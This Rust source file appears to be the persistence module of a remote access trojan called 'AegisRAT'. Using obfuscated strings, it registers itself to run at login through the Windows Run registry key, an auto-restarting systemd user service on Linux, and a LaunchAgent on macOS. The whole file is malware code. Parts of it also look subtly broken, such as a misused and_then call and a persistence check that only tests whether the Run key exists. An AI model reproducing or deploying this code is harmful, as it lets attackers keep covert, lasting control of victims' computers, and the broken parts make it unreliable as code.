#[cfg(target_os = "windows")]
use winapi::um::winreg::{RegOpenKeyExW, RegSetValueExW, RegCloseKey, HKEY_CURRENT_USER, KEY_WRITE, REG_SZ};
#[cfg(target_os = "windows")]
use winapi::shared::minwindef::LPDWORD;

pub fn is_persistent() -> bool {
    #[cfg(target_os = "windows")]
    {
        // Check if Run key exists
        unsafe {
            let mut h_key = std::ptr::null_mut();
            let run_path: Vec<u16> = obf!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").encode_utf16().collect();
            let result = winapi::um::winreg::RegOpenKeyExW(
                HKEY_CURRENT_USER,
                run_path.as_ptr(),
                0,
                winapi::um::winreg::KEY_READ,
                &mut h_key,
            );
            if result == winapi::um::winreg::ERROR_SUCCESS {
                RegCloseKey(h_key);
                true
            } else {
                false
            }
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Check for systemd service or launch agent
        let systemd_path = dirs::data_dir().and_then(|d| d.join("systemd").join("user").join("aegis.service"));
        systemd_path.map(|p| p.exists()).unwrap_or(false)
    }
}

pub fn add_persistence() {
    #[cfg(target_os = "windows")]
    {
        unsafe {
            let mut h_key = std::ptr::null_mut();
            let run_path: Vec<u16> = obf!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").encode_utf16().collect();
            let result = winapi::um::winreg::RegOpenKeyExW(
                HKEY_CURRENT_USER,
                run_path.as_ptr(),
                0,
                winapi::um::winreg::KEY_WRITE,
                &mut h_key,
            );
            
            if result == winapi::um::winreg::ERROR_SUCCESS {
                let value_name: Vec<u16> = obf!("AegisRAT").encode_utf16().collect();
                let exe_path = std::env::current_exe().unwrap();
                let exe_path_w: Vec<u16> = exe_path.to_string_lossy().encode_utf16().collect();
                
                let _ = winapi::um::winreg::RegSetValueExW(
                    h_key,
                    value_name.as_ptr(),
                    0,
                    winapi::um::winreg::REG_SZ,
                    exe_path_w.as_ptr() as *const u8,
                    (exe_path_w.len() * 2) as u32,
                );
                RegCloseKey(h_key);
            }
        }
    }
    
    #[cfg(target_os = "linux")]
    {
        // Create a systemd user service
        let service_dir = dirs::data_dir().and_then(|d| d.join("systemd").join("user"));
        if let Some(dir) = service_dir {
            let _ = std::fs::create_dir_all(&dir);
            let service_path = dir.join("aegis.service");
            let exe_path = std::env::current_exe().unwrap();
            let content = format!("[Unit]\nDescription=AegisRAT\n\n[Service]\nExecStart={}\nRestart=always\n\n[Install]\nWantedBy=default.target", exe_path.to_string_lossy());
            let _ = std::fs::write(&service_path, content);
            let _ = std::process::Command::new("systemctl").args(&["--user", "daemon-reload"]).status();
            let _ = std::process::Command::new("systemctl").args(&["--user", "enable", "aegis.service"]).status();
        }
    }
    
    #[cfg(target_os = "macos")]
    {
        // Create a LaunchAgent
        let agent_dir = dirs::home_dir().and_then(|d| d.join("Library").join("LaunchAgents"));
        if let Some(dir) = agent_dir {
            let _ = std::fs::create_dir_all(&dir);
            let agent_path = dir.join("com.aegis.rat.plist");
            let exe_path = std::env::current_exe().unwrap();
            let content = format!(
                r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.aegis.rat</string>
    <key>ProgramArguments</key>
    <array>
        <string>{}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"#,
                exe_path.to_string_lossy()
            );
            let _ = std::fs::write(&agent_path, content);
            let _ = std::process::Command::new("launchctl").args(&["load", agent_path.to_string_lossy().as_ref()]).status();
        }
    }
}